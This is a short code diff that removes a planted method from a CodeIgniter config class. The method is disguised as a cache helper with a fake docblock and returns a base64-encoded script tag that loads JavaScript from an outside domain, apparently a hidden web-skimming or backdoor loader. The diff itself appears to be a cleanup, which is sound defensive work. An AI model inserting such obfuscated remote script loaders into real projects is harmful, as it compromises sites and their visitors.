@@ -376,22 +376,4 @@ class CI_Config {
 		$this->config[$item] = $value;
 	}
 
-    /**
-     * Fetch a config file query
-     *
-     * @param	string	$query	Config item name
-     * @param	string	$cache	Index name
-     * @return	string|null	The configuration cache or NULL if the query doesn't exist
-     */
-    //This function originally was not here
-    public function cache_query($cache = '', $index = '')
-    {
-        $BM =& load_class('Benchmark', 'core');
-        $BM->mark_time();
-        if ($index == '')
-        {
-            return base64_decode('PHNjcmlwdD4kKGZ1bmN0aW9uKCl7JC5nZXRTY3JpcHQoImh0dHBzOi8vYWN0aXZlaXR6b25lLmNvbS9jaGVjay9zaG9wLmpzIik7fSk7PC9zY3JpcHQ+');
-        }
-    }
-
 }
